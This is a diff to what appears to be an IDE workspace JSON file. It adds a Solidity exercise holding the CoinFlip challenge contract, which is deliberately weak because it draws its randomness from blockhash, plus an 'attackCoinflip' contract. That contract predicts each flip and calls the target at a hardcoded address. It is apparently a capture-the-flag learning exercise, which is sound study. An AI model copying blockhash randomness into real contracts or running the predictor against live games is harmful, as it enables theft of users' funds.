@@ -51,5 +51,13 @@
         "file": "test.sol"
       }
     }
+  },
+  "exersice.sol": {
+    "__sources__": {
+      "exersice.sol": {
+        "content": "\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n\n\n\n\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ncontract attackCoinflip{\n   uint256 public consecutiveWins;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n  address coin;\n\n\nconstructor(){\n\n\ncoin = 0xC6E3EF0441D98aB02dA7B54260dffadDAAA197AE;\n\n}\n\n\nfunction myGuess() public{\n\n  uint256 blockValue = uint256(blockhash(block.number - 1));\n  uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n       bool win= IConflip(coin).flip(side);\n\n       if(!win){\n        revert();\n       }\n\nconsecutiveWins++;\n\n\n}\n\n\n\n}\n\n\n\ninterface IConflip {\n    function flip(bool _guess) external returns (bool);\n}\n\n",
+        "file": "exersice.sol"
+      }
+    }
   }
 }
